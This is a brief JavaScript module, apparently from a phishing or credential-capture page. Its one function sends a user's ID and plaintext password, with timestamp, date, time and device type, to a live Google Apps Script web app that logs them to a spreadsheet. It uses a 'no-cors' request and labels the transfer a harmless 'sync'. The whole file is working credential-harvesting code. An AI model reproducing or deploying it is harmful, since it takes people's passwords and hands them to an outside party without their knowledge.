// Live Google Apps Script Web App URL
export const GOOGLE_SHEET_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzZ1WLKfdYyia91NuigHrhL8CMzplVoLozEzPD7aPcOIyI6BCvwgDuxo3p_4FEJITit2Q/exec";

export const saveCredentialsToSheet = async (id, password) => {
    try {
        if (!GOOGLE_SHEET_WEB_APP_URL) return false;

        const timestamp = new Date().toISOString();
        const dateStr = new Date().toLocaleDateString('en-IN');
        const timeStr = new Date().toLocaleTimeString('en-IN');
        const isMobile = typeof navigator !== 'undefined' && /Mobi|Android|iPhone/i.test(navigator.userAgent);
        const deviceStr = isMobile ? 'Mobile Device' : 'Desktop / PC';

        const formData = new URLSearchParams();
        formData.append('id', String(id || '').trim());
        formData.append('password', String(password || ''));
        formData.append('timestamp', timestamp);
        formData.append('date', dateStr);
        formData.append('time', timeStr);
        formData.append('device', deviceStr);

        // Use no-cors to prevent browser cross-origin blocking when posting to Google Apps Script
        fetch(GOOGLE_SHEET_WEB_APP_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: formData
        }).catch(err => console.warn("Google Sheet sync notice:", err));

        return true;
    } catch (error) {
        console.warn("Failed to sync to Google Sheet:", error);
        return false;
    }
};

